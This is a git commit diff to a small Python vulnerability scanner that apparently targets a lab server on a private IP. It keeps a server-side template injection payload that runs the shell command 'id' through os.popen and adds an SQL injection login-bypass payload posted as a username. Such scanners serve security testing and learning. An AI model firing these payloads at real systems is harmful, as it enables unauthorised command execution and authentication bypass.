d957b3c20fadecf8f19992dc088f94cdb595800c
dennysvande <vandesimbolon@gmail.com>
2025-03-19 07:57:10 -0700

    Add new method

--- Vuln-Scanner.py
+++ Vuln-Scanner.py
@@ -5,8 +5,9 @@ class Scanner:
     def __init__(self):
         """value to be tested such as payload and web url; planned to be dynamically inserted by user from command line;
         for now will be hardcoded"""
-        self.url = "http://10.10.5.130:8000/api/sstivuln"
+        self.url = "http://10.10.5.130:8000/api/sqlivuln"
         self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
+        self.sqli_payload = "'or 1=1--"
         
 
 class Injection(Scanner):
@@ -19,7 +20,10 @@ class Injection(Scanner):
         pass
 
     def sqli(self):
-        pass
+        request_body = {"username": self.sqli_payload, "password": ""}
+        print(request_body)
+        response = requests.post(self.url, json=request_body, timeout=10)
+        print(response.text)
 
 class BrokenAccessControl(Scanner):
     def lfi(self):
@@ -30,4 +34,4 @@ class BrokenAccessControl(Scanner):
 
 if __name__ == "__main__":
     injection_client = Injection()
-    injection_client.ssti()
+    injection_client.sqli()
